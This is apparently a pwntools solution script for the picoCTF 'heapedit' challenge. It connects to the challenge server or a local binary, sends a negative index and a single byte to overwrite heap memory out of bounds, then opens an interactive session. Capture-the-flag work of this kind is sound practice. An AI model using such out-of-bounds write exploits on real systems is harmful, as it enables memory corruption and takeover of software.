from pwn import *

e = ELF("./heapedit")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 17612)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

debug()
p.sendlineafter(":", "-5144")
p.sendlineafter(":", "\x08")


p.interactive()
